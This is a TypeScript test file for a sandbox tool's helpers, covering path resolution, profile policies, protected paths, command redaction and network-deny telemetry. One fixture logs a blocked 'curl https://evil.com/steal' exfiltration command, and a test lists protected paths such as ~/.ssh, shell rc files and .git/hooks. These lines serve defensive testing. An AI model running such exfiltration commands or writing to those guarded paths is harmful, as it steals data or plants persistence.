import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, rmSync, symlinkSync, realpathSync } from "node:fs";
import { tmpdir, homedir } from "node:os";
import { join } from "node:path";

import {
	expandTilde,
	resolvePath,
	matchesAnyPath,
	extractDomain,
	redactCommand,
	formatStatusline,
	loadProfilePolicy,
	loadProtectedPaths,
	DEFAULT_PROTECTED_PATHS,
	logNetworkDeny,
	pruneOldTelemetry,
	TELEMETRY_RETENTION_DAYS,
} from "./helpers.js";

// ── expandTilde ─────────────────────────────────────────────────

describe("expandTilde", () => {
	const home = homedir();

	it("expands ~/foo to homedir/foo", () => {
		assert.equal(expandTilde("~/foo"), join(home, "foo"));
	});

	it("expands bare ~ to homedir", () => {
		assert.equal(expandTilde("~"), home);
	});

	it("leaves absolute paths unchanged", () => {
		assert.equal(expandTilde("/absolute/path"), "/absolute/path");
	});

	it("leaves relative paths unchanged", () => {
		assert.equal(expandTilde("relative/path"), "relative/path");
	});
});

// ── resolvePath ─────────────────────────────────────────────────

describe("resolvePath", () => {
	const home = homedir();
	const cwd = "/work/project";
	let tmpDir: string;

	before(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "sandbox-test-resolve-"));
	});

	after(() => {
		rmSync(tmpDir, { recursive: true, force: true });
	});

	it("returns non-existent absolute paths unchanged", () => {
		assert.equal(resolvePath("/nonexistent-test-path/node", cwd), "/nonexistent-test-path/node");
	});

	it("expands tilde paths", () => {
		assert.equal(resolvePath("~/foo", cwd), join(home, "foo"));
	});

	it("joins relative paths with cwd", () => {
		assert.equal(resolvePath("src/main.ts", cwd), join(cwd, "src/main.ts"));
	});

	it("resolves symlinks to their real path", () => {
		const realTmpDir = realpathSync(tmpDir);
		const realFile = join(realTmpDir, "real.txt");
		const linkFile = join(realTmpDir, "link.txt");
		writeFileSync(realFile, "hello");
		symlinkSync(realFile, linkFile);
		assert.equal(resolvePath(linkFile, cwd), realFile);
	});

	it("resolves through symlinked parent even when target does not exist", () => {
		const realTmpDir = realpathSync(tmpDir);
		const realDir = join(realTmpDir, "real-dir");
		const linkDir = join(realTmpDir, "link-dir");
		mkdirSync(realDir);
		symlinkSync(realDir, linkDir);
		const throughLink = join(linkDir, "new-file.txt");
		assert.equal(resolvePath(throughLink, cwd), join(realDir, "new-file.txt"));
	});

	it("uses the real existing parent when target does not exist", () => {
		const missing = join(tmpDir, "does-not-exist.txt");
		assert.equal(resolvePath(missing, cwd), join(realpathSync(tmpDir), "does-not-exist.txt"));
	});
});

// ── matchesAnyPath ──────────────────────────────────────────────

describe("matchesAnyPath", () => {
	const home = homedir();
	const cwd = "/work/project";

	it("returns true when path is inside a pattern", () => {
		assert.equal(
			matchesAnyPath("/work/project/src/file.ts", ["/work/project"], cwd),
			true,
		);
	});

	it("returns false when path is outside all patterns", () => {
		assert.equal(
			matchesAnyPath("/other/dir/file.ts", ["/work/project"], cwd),
			false,
		);
	});

	it("handles tilde patterns", () => {
		assert.equal(
			matchesAnyPath(join(home, ".ssh/id_rsa"), ["~/.ssh"], cwd),
			true,
		);
	});

	it("resolves dot pattern relative to cwd", () => {
		assert.equal(
			matchesAnyPath("/work/project/file.ts", ["."], cwd),
			true,
		);
	});

	it("returns false for empty patterns", () => {
		assert.equal(matchesAnyPath("/any/path", [], cwd), false);
	});

	it("returns true for exact match", () => {
		assert.equal(
			matchesAnyPath("/work/project", ["/work/project"], cwd),
			true,
		);
	});

	it("does NOT match path that shares prefix but crosses boundary", () => {
		assert.equal(
			matchesAnyPath("/work/project2/file.ts", ["/work/project"], cwd),
			false,
		);
	});

	it("matches path that is a child with slash boundary", () => {
		assert.equal(
			matchesAnyPath("/work/project/src/file.ts", ["/work/project"], cwd),
			true,
		);
	});

	it("matches when cwd is a symlinked alias of the real path", () => {
		const tmp = mkdtempSync(join(tmpdir(), "sandbox-test-match-symlink-"));
		const realTmp = realpathSync(tmp);
		const aliasParent = join(realTmp, "alias-parent");
		mkdirSync(aliasParent);
		const realCwd = join(realTmp, "real-cwd");
		mkdirSync(realCwd);
		const aliasCwd = join(aliasParent, "cwd-link");
		symlinkSync(realCwd, aliasCwd);

		const absPath = join(realCwd, "file.txt");
		assert.equal(matchesAnyPath(absPath, ["."], aliasCwd), true);

		rmSync(tmp, { recursive: true, force: true });
	});
});

// ── loadProfilePolicy ───────────────────────────────────────────

describe("loadProfilePolicy", () => {
	let tmpDir: string;

	before(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "sandbox-test-profiles-"));
	});

	after(() => {
		rmSync(tmpDir, { recursive: true, force: true });
	});

	it('returns null for "open" profile', () => {
		assert.equal(loadProfilePolicy("open"), null);
	});

	it("parses a valid profile file", () => {
		const policy = {
			network: { allowedDomains: ["example.com"], deniedDomains: [] },
			filesystem: { denyRead: [], allowWrite: ["."], denyWrite: [] },
		};
		writeFileSync(join(tmpDir, "intro-sec.json"), JSON.stringify(policy));

		const result = loadProfilePolicy("intro-sec", tmpDir);
		assert.deepEqual(result, policy);
	});

	it("throws for unknown profile name", () => {
		assert.throws(
			() => loadProfilePolicy("bogus", tmpDir),
			/Unknown profile "bogus"/,
		);
	});

	it("throws when profile file is missing", () => {
		assert.throws(
			() => loadProfilePolicy("engineering", tmpDir),
			/Profile policy file not found/,
		);
	});

	it("throws for invalid JSON", () => {
		writeFileSync(join(tmpDir, "engineering.json"), "{ not valid json }}}");
		assert.throws(
			() => loadProfilePolicy("engineering", tmpDir),
			/Failed to parse/,
		);
	});

	it("throws for wrong shape (number instead of string[])", () => {
		const bad = { network: { allowedDomains: 42, deniedDomains: [] } };
		writeFileSync(join(tmpDir, "intro-sec.json"), JSON.stringify(bad));
		assert.throws(
			() => loadProfilePolicy("intro-sec", tmpDir),
			/must be a string\[\]/,
		);
	});

	it("rejects bare wildcard domain '*'", () => {
		const bad = {
			network: { allowedDomains: ["*"], deniedDomains: [] },
			filesystem: { denyRead: [], allowWrite: ["."], denyWrite: [] },
		};
		writeFileSync(join(tmpDir, "intro-sec.json"), JSON.stringify(bad));
		assert.throws(
			() => loadProfilePolicy("intro-sec", tmpDir),
			/entry "\*" is not allowed/,
		);
	});

	it("rejects invalid wildcard syntax", () => {
		const bad = {
			network: { allowedDomains: ["foo*bar.com"], deniedDomains: [] },
			filesystem: { denyRead: [], allowWrite: ["."], denyWrite: [] },
		};
		writeFileSync(join(tmpDir, "intro-sec.json"), JSON.stringify(bad));
		assert.throws(
			() => loadProfilePolicy("intro-sec", tmpDir),
			/invalid wildcard syntax/,
		);
	});

	it("rejects filesystem wildcard patterns", () => {
		const bad = {
			network: { allowedDomains: ["github.com"], deniedDomains: [] },
			filesystem: { denyRead: [], allowWrite: ["."], denyWrite: ["*.pem"] },
		};
		writeFileSync(join(tmpDir, "intro-sec.json"), JSON.stringify(bad));
		assert.throws(
			() => loadProfilePolicy("intro-sec", tmpDir),
			/glob matching is not supported/,
		);
	});

	it("adds default network when network is missing", () => {
		// Overwrite engineering.json with valid content, no network key
		const policy = { filesystem: { denyRead: [], allowWrite: ["."], denyWrite: [] } };
		writeFileSync(join(tmpDir, "engineering.json"), JSON.stringify(policy));

		const result = loadProfilePolicy("engineering", tmpDir);
		assert.deepEqual(result!.network, { allowedDomains: [], deniedDomains: [] });
	});
});

// ── loadProtectedPaths ──────────────────────────────────────────

describe("loadProtectedPaths", () => {
	let tmpDir: string;

	before(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "sandbox-test-protected-"));
	});

	after(() => {
		rmSync(tmpDir, { recursive: true, force: true });
	});

	it("loads paths from valid config file", () => {
		const config = { denyWrite: ["/custom/path", "~/.secret"] };
		writeFileSync(join(tmpDir, "protected-paths.json"), JSON.stringify(config));
		const result = loadProtectedPaths(tmpDir);
		assert.deepEqual(result, ["/custom/path", "~/.secret"]);
	});

	it("returns defaults when file missing", () => {
		const emptyDir = mkdtempSync(join(tmpdir(), "sandbox-test-protected-empty-"));
		try {
			const result = loadProtectedPaths(emptyDir);
			assert.deepEqual(result, [...DEFAULT_PROTECTED_PATHS]);
		} finally {
			rmSync(emptyDir, { recursive: true, force: true });
		}
	});

	it("returns defaults when invalid JSON", () => {
		writeFileSync(join(tmpDir, "protected-paths.json"), "{ broken json !!!");
		const result = loadProtectedPaths(tmpDir);
		assert.deepEqual(result, [...DEFAULT_PROTECTED_PATHS]);
	});

	it("returns defaults when config uses unsupported wildcard patterns", () => {
		writeFileSync(join(tmpDir, "protected-paths.json"), JSON.stringify({ denyWrite: ["*.pem"] }));
		const result = loadProtectedPaths(tmpDir);
		assert.deepEqual(result, [...DEFAULT_PROTECTED_PATHS]);
	});

	it("defaults include shell rc, .ssh, .git/hooks", () => {
		assert.ok(DEFAULT_PROTECTED_PATHS.includes("~/.bashrc"));
		assert.ok(DEFAULT_PROTECTED_PATHS.includes("~/.zshrc"));
		assert.ok(DEFAULT_PROTECTED_PATHS.includes("~/.profile"));
		assert.ok(DEFAULT_PROTECTED_PATHS.includes("~/.bash_profile"));
		assert.ok(DEFAULT_PROTECTED_PATHS.includes("~/.ssh"));
		assert.ok(DEFAULT_PROTECTED_PATHS.includes(".git/hooks"));
	});
});

// ── formatStatusline ────────────────────────────────────────────

describe("formatStatusline", () => {
	it('returns warning style with "no sandbox" for open', () => {
		const result = formatStatusline("open", null);
		assert.equal(result.style, "warning");
		assert.match(result.text, /no sandbox/);
	});

	it('shows "allowlist" and 0 write paths for intro-sec', () => {
		const policy = {
			network: { allowedDomains: ["github.com"], deniedDomains: [] },
			filesystem: { allowWrite: [] },
		};
		const result = formatStatusline("intro-sec", policy);
		assert.match(result.text, /allowlist/);
		assert.match(result.text, /0 write paths/);
		assert.equal(result.style, "accent");
	});

	it('shows "allowlist" and correct write count for engineering', () => {
		const policy = {
			network: { allowedDomains: ["github.com"], deniedDomains: [] },
			filesystem: { allowWrite: [".", "/tmp", "~/work"] },
		};
		const result = formatStatusline("engineering", policy);
		assert.match(result.text, /allowlist/);
		assert.match(result.text, /3 write paths/);
	});

	it("handles null policy for non-open profile gracefully", () => {
		const result = formatStatusline("custom", null);
		assert.equal(result.style, "accent");
		assert.match(result.text, /allowlist/);
		assert.match(result.text, /0 write paths/);
	});
});

// ── extractDomain ───────────────────────────────────────────────

describe("extractDomain", () => {
	it("extracts domain from curl https URL", () => {
		assert.equal(
			extractDomain("curl https://example.com/path?q=1"),
			"example.com",
		);
	});

	it("extracts domain from wget http URL with port", () => {
		assert.equal(
			extractDomain("wget http://foo.bar:8080/x"),
			"foo.bar",
		);
	});

	it('returns "(unknown)" when no URL is found', () => {
		assert.equal(extractDomain("echo hello"), "(unknown)");
	});
});

// ── redactCommand ───────────────────────────────────────────────

describe("redactCommand", () => {
	it("returns short commands unchanged", () => {
		assert.equal(redactCommand("ls -la"), "ls -la");
	});

	it("truncates commands longer than 120 chars", () => {
		const long = "a".repeat(200);
		const result = redactCommand(long);
		assert.equal(result.length, 120);
	});

	it("redacts token=secret values", () => {
		const result = redactCommand("curl -H token=secret123 https://api.example.com");
		assert.match(result, /token=\[REDACTED\]/);
		assert.ok(!result.includes("secret123"));
	});

	it("redacts Authorization: Bearer values", () => {
		const result = redactCommand("curl -H 'Authorization: Bearer xyz789' https://api.example.com");
		assert.match(result, /Authorization: \[REDACTED\]/);
		// The regex replaces the first \S+ after keyword (Bearer), not subsequent tokens
		assert.ok(!result.includes("Bearer"));
	});

	it("redacts password= values", () => {
		const result = redactCommand("mysql --password=abc123 -h localhost");
		assert.match(result, /password=\[REDACTED\]/);
		assert.ok(!result.includes("abc123"));
	});
});

// ── logNetworkDeny ──────────────────────────────────────────────

describe("logNetworkDeny", () => {
	let tmpDir: string;

	before(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "sandbox-test-telemetry-"));
	});

	after(() => {
		rmSync(tmpDir, { recursive: true, force: true });
	});

	it("writes valid JSONL to telemetry dir", () => {
		logNetworkDeny(
			{
				type: "blocked",
				profile: "engineering",
				domain: "evil.com",
				commandPreview: "curl https://evil.com/steal",
			},
			tmpDir,
		);

		const files = readdirSync(tmpDir).filter((f) => f.endsWith(".jsonl"));
		assert.equal(files.length, 1);

		const content = readFileSync(join(tmpDir, files[0]), "utf-8").trim();
		const record = JSON.parse(content);
		assert.equal(typeof record, "object");
	});

	it("record contains ts, type, profile, domain", () => {
		const files = readdirSync(tmpDir).filter((f) => f.endsWith(".jsonl"));
		const content = readFileSync(join(tmpDir, files[0]), "utf-8").trim();
		const record = JSON.parse(content);

		assert.ok(record.ts);
		assert.equal(record.type, "blocked");
		assert.equal(record.profile, "engineering");
		assert.equal(record.domain, "evil.com");
	});

	it("includes truncated command_preview", () => {
		const longCmd = "curl " + "x".repeat(200);
		logNetworkDeny(
			{
				type: "self-restrained",
				profile: "intro-sec",
				domain: "test.com",
				commandPreview: longCmd.slice(0, 120),
			},
			tmpDir,
		);

		const files = readdirSync(tmpDir).filter((f) => f.endsWith(".jsonl"));
		const content = readFileSync(join(tmpDir, files[0]), "utf-8").trim();
		const lines = content.split("\n");
		const last = JSON.parse(lines[lines.length - 1]);
		assert.ok(last.command_preview.length <= 120);
	});
});

// ── pruneOldTelemetry ───────────────────────────────────────────

describe("pruneOldTelemetry", () => {
	let tmpDir: string;

	before(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "sandbox-test-prune-"));
	});

	after(() => {
		rmSync(tmpDir, { recursive: true, force: true });
	});

	it("deletes files older than retention period", () => {
		const oldDate = new Date(Date.now() - (TELEMETRY_RETENTION_DAYS + 5) * 86400_000)
			.toISOString().slice(0, 10);
		writeFileSync(join(tmpDir, `network-deny-${oldDate}.jsonl`), "old data\n");

		pruneOldTelemetry(tmpDir);

		const remaining = readdirSync(tmpDir);
		assert.ok(!remaining.includes(`network-deny-${oldDate}.jsonl`));
	});

	it("keeps recent files", () => {
		const recentDate = new Date().toISOString().slice(0, 10);
		writeFileSync(join(tmpDir, `network-deny-${recentDate}.jsonl`), "recent data\n");

		pruneOldTelemetry(tmpDir);

		const remaining = readdirSync(tmpDir);
		assert.ok(remaining.includes(`network-deny-${recentDate}.jsonl`));
	});

	it("ignores non-matching filenames", () => {
		writeFileSync(join(tmpDir, "readme.txt"), "not telemetry\n");

		pruneOldTelemetry(tmpDir);

		const remaining = readdirSync(tmpDir);
		assert.ok(remaining.includes("readme.txt"));
	});

	it("does not error on missing directory", () => {
		// Should not throw
		pruneOldTelemetry(join(tmpDir, "nonexistent-subdir"));
	});
});
